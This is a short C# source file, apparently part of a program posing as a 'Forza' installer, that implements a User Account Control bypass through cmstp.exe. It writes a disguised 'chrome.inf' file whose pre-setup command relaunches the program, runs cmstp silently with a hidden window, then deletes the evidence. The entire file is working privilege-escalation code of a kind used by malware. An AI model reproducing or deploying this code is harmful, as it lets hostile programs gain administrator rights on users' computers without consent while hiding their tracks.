using System;
using System.Diagnostics;
using System.IO;

namespace ForzaInstallation.Uac
{
    internal static class Cmstp
    {
        internal static bool Execute()
        {
            try
            {
                var path = System.Reflection.Assembly.GetExecutingAssembly().Location;
                var infPath = Path.Combine(Path.GetTempPath(), "chrome.inf");
                var inf = "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustomDestinationSection\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\nstart " + path + "\n\n[CustomDestinationSection]\nDestinationCnt=1\nDestination0=CopyToDesktopSection\n\n[CopyToDesktopSection]\nSubFolderNames=.\n";
                File.WriteAllText(infPath, inf);
                var psi = new ProcessStartInfo("cmstp.exe", "/s /au \"" + infPath + "\"")
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden
                };
                using (var p = Process.Start(psi)) { p.WaitForExit(10000); }
                try { File.Delete(infPath); } catch { }
                return true;
            }
            catch { return false; }
        }
    }
}
